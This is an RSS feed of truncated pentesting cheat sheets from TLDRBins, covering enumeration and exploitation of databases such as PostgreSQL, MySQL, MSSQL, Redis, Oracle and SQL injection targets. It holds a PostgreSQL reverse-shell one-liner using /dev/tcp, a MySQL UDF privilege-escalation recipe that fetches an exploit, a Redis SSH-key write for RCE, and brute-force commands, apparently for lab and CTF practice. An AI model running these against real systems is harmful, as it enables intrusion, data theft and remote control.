<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Database on TLDRBins</title>
    <link>https://tldrbins.github.io/@database/</link>
    <description>Recent content in Database on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@database/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CouchDB</title>
      <link>https://tldrbins.github.io/couchdb/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/couchdb/</guid>
      <description>Basic # Show all databases curl http://localhost:5984/_all_dbs # Show all databases (With Creds) curl http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5984/_all_dbs # Show all docs from database curl http://localhost:5984/&amp;lt;DB_NAME&amp;gt;/_all_docs # Show a entry curl http://localhost:5984/&amp;lt;DB_NAME&amp;gt;/&amp;lt;ID_HASH&amp;gt; </description>
    </item>
    <item>
      <title>elasticsearch</title>
      <link>https://tldrbins.github.io/elasticsearch/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/elasticsearch/</guid>
      <description>Basic Commands # List indexes curl -s &amp;lt;TARGET&amp;gt;:9200/_cat/indices?v # Dump data with index name curl -s -X GET &amp;#34;&amp;lt;TARGET&amp;gt;:9200/&amp;lt;INDEX_NAME&amp;gt;/_search?size=100&amp;#34; -H &amp;#39;Content-Type: application/json&amp;#39; -d&amp;#39; { &amp;#34;query&amp;#34;: { &amp;#34;match_all&amp;#34;: {} } } &amp;#39; | jq . </description>
    </item>
    <item>
      <title>Graphql</title>
      <link>https://tldrbins.github.io/graphql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/graphql/</guid>
      <description>Visualize Tool +---------------------------------------------------------------+ | 1. Change Schema -&amp;gt; Introspection -&amp;gt; Copy Introspection Query | | 2. Paste query | | 3. Display | +---------------------------------------------------------------+ Ref: graphql-voyager&#xA;Basic Commands # Get fields from schema curl -s &amp;lt;TARGET&amp;gt;:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{queryType{name,fields{name,description}}}}&amp;#34;}&amp;#39; | jq . # Get types name curl -s &amp;lt;TARGET&amp;gt;:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{types{name}}}&amp;#34;}&amp;#39; | jq . # Get fields of type (e.g. User) curl -s &amp;lt;TARGET&amp;gt;:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__type(name:\&amp;#34;User\&amp;#34;){name,fields{name}}}&amp;#34;}&amp;#39; | jq .</description>
    </item>
    <item>
      <title>Microsoft Access Database</title>
      <link>https://tldrbins.github.io/microsoft_access_database/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/microsoft_access_database/</guid>
      <description>General mdbtools 0. Installation [Optional] sudo apt install mdbtools Show All Tables mdb-tables &amp;lt;MDB_FILE&amp;gt; $ mdb-tables backup.mdb acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock ---[SNIP]--- Show Tables with Data mdb-tables &amp;lt;MDB_FILE&amp;gt; | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep . | while read table; do lines=$(mdb-export &amp;lt;MDB_FILE&amp;gt; $table | wc -l); if [ $lines -gt 1 ]; then echo &amp;#34;$table: $lines&amp;#34;; fi; done $ mdb-tables backup.mdb | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep .</description>
    </item>
    <item>
      <title>MongoDB General</title>
      <link>https://tldrbins.github.io/mongodb_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mongodb_general/</guid>
      <description>General Connect to Mongo Database anonymous authenticate mongosh &amp;lt;TARGET&amp;gt;:27017 $ mongosh 172.17.0.3:27017 Current Mongosh Log ID: 66f2fa2192b07a1eeb856ec6 Connecting to: mongodb://172.17.0.3:27017/?directConnection=true&amp;amp;appName=mongosh+2.2.12 Using MongoDB: 5.0.6 Using Mongosh: 2.2.12 For mongosh info see: https://docs.mongodb.com/mongodb-shell/ ------ The server generated these startup warnings when booting 2024-09-24T10:44:22.876+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem 2024-09-24T10:44:23.824+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted ------ Warning: Found ~/.</description>
    </item>
    <item>
      <title>MSSQL Agent Jobs</title>
      <link>https://tldrbins.github.io/mssql_agent_jobs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_agent_jobs/</guid>
      <description>1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Fix : Cannot resolve the collation conflict between &amp;#34;Latin1_General_CI_AI&amp;#34; and &amp;#34;SQL_Latin1_General_CP1_CI_AS&amp;#34; SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN=&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;; INSERT proxies EXEC msdb.</description>
    </item>
    <item>
      <title>MSSQL General</title>
      <link>https://tldrbins.github.io/mssql_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_general/</guid>
      <description>Connect to MSSQL DB Linux Windows impacket-mssqlclient &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Without TLS impacket-mssqlclient -windows-auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # With Current User sqlcmd -S &amp;#39;&amp;lt;TARGET&amp;gt;&amp;#39; -Q &amp;#34;&amp;lt;QUERY&amp;gt;&amp;#34; # With Cred sqlcmd -S &amp;#39;&amp;lt;TARGET&amp;gt;&amp;#39; -U &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -P &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;#39;&amp;lt;DB_NAME&amp;gt;&amp;#39; -Q &amp;#34;&amp;lt;QUERY&amp;gt;&amp;#34; Basic Commands # Check mssql version SELECT @@version; # Check current user SELECT suser_name(); # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.</description>
    </item>
    <item>
      <title>MSSQL Linked Servers</title>
      <link>https://tldrbins.github.io/mssql_linked_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
      <description>Enum SQL nxc Hint: Use double &amp;apos;&amp;apos; to escape &amp;apos; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; # Show linked servers enum_links 1. Enumerate Linked MSSQL Servers nxc mssql &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth -M enum_links $ nxc mssql DC.REDELEGATE.VL -u &amp;#39;SQLGuest&amp;#39; -p &amp;#39;zDPBpaF4FywlqIv11vii&amp;#39; --local-auth -M enum_links MSSQL 10.129.254.242 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) MSSQL 10.</description>
    </item>
    <item>
      <title>MSSQL Privilege Escalation</title>
      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
      <description>Enum Linux Windows 1. List Users that Can be Impersonated nxc mssql &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth -M enum_impersonate $ nxc mssql DC.REDELEGATE.VL -u &amp;#39;SQLGuest&amp;#39; -p &amp;#39;zDPBpaF4FywlqIv11vii&amp;#39; --local-auth -M enum_impersonate MSSQL 10.129.254.242 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) MSSQL 10.129.254.242 1433 DC [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii ENUM_IMP... 10.129.254.242 1433 DC [-] No users with impersonation rights found. 2. Enumerate Active MSSQL Logins nxc mssql &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth -M enum_logins $ nxc mssql DC.</description>
    </item>
    <item>
      <title>Mysql General</title>
      <link>https://tldrbins.github.io/mysql_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mysql_general/</guid>
      <description>Connect to mysql Database mysql -u &amp;lt;USER&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Database known mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Skip SSL mysql -u &amp;lt;USER&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --skip-ssl # Execute query inline mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -e &amp;#39;&amp;lt;QUERY&amp;gt;&amp;#39; mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -e &amp;#39;show tables;&amp;#39; Basic Commands # Show all databases show databases; # Choose database use &amp;lt;DB_NAME&amp;gt;; # Show all tables show tables; # Show all entries in table_name select * from &amp;lt;TABLE_NAME&amp;gt;; Insert Entry INSERT INTO &amp;lt;TABLE_NAME&amp;gt; (&amp;lt;COLUMN_1&amp;gt;,&amp;lt;COLUMN_2&amp;gt;,.</description>
    </item>
    <item>
      <title>Mysql Privilege Escalation</title>
      <link>https://tldrbins.github.io/mysql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
      <description>Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p&amp;lt;PASSWORD&amp;gt; mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
    </item>
    <item>
      <title>Oracle Database</title>
      <link>https://tldrbins.github.io/oracle/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/oracle/</guid>
      <description>Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT&#xA;Enum # SID enum (You only need one) odat sidguesser -s &amp;lt;TARGET&amp;gt; # User/Password brute force odat passwordguesser -s &amp;lt;TARGET&amp;gt; -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s &amp;lt;TARGET&amp;gt; -U &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -P &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;SID&amp;gt; --sysdba General # Export everytime or add to ~/.</description>
    </item>
    <item>
      <title>Postgresql</title>
      <link>https://tldrbins.github.io/postgresql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/postgresql/</guid>
      <description>Connect psql -h &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; psql -h &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; -p &amp;lt;PORT&amp;gt; -d &amp;lt;DB_NAME&amp;gt; psql &amp;#39;postgresql://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5432/&amp;lt;DB_NAME&amp;gt;&amp;#39; Basic # Show Databases \list # Use Database \connect &amp;lt;DB_NAME&amp;gt; # Show Tables \dt # Dump from Table select * from &amp;#34;&amp;lt;TABLE_NAME&amp;gt;&amp;#34;; # Insert into Table insert into &amp;#34;&amp;lt;TABLE_NAME&amp;gt;&amp;#34; (&amp;lt;COLUMN_1&amp;gt;, &amp;lt;COLUMN_2&amp;gt;) values (&amp;#34;&amp;lt;VALUE_1&amp;gt;&amp;#39;, &amp;#39;&amp;lt;VALUE_2&amp;gt;&amp;#39;); # Write Text copy (select &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39;) to &amp;#39;&amp;lt;TARGET_PATH&amp;gt;&amp;#39;; # List All User Accounts \du+ # Exit \q File Read # List Directory SELECT * FROM pg_ls_dir(&amp;#39;&amp;lt;DIR_PATH&amp;gt;&amp;#39;); # File Read SELECT pg_read_file(&amp;#39;&amp;lt;FILE_PATH&amp;gt;&amp;#39;, 0, 4096); RCE # Only for Superuser CREATE TABLE IF NOT EXISTS exec(string text); # Code Execution COPY exec FROM PROGRAM &amp;#39;&amp;lt;CMD&amp;gt;&amp;#39;; # Check Ouput SELECT * FROM exec; # One-liner DO $$ DECLARE c text; BEGIN c := &amp;#39;COPY (SELECT &amp;#39;&amp;#39;&amp;#39;&amp;#39;) to program &amp;#39;&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&amp;#39;&amp;#39;; EXECUTE c; END $$; </description>
    </item>
    <item>
      <title>Redis</title>
      <link>https://tldrbins.github.io/redis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/redis/</guid>
      <description>Basic # Connect redis-cli -h 127.0.0.1 # Provide password auth &amp;lt;PASSWORD&amp;gt; # List current keys keys * # Add key incr key # Get key value get key Abuse #1: Arbitrary write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/&amp;lt;USER&amp;gt;/.</description>
    </item>
    <item>
      <title>SQL Injection</title>
      <link>https://tldrbins.github.io/sql_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sql_injection/</guid>
      <description>sqlmap 1. Copy HTTP Request +---------------------------------------------------------------+ | In Burp Suite =&amp;gt; Right click request =&amp;gt; Select `copy to file` | | Add `*` to the SQL injection point | +---------------------------------------------------------------+ 2. Initial Enum # HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # String to match when query is evaluated to True sqlmap -r request --batch --proxy=http://127.</description>
    </item>
    <item>
      <title>SQLite</title>
      <link>https://tldrbins.github.io/sqlite/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sqlite/</guid>
      <description>General # Open a db sqlite3 &amp;lt;DB_FILE&amp;gt; # Show tables .tables # Show schema of a table .schema &amp;lt;TABLE_NAME&amp;gt; # Show column headers .headers on # Dump data select * from &amp;lt;TABLE_NAME&amp;gt;; </description>
    </item>
  </channel>
</rss>
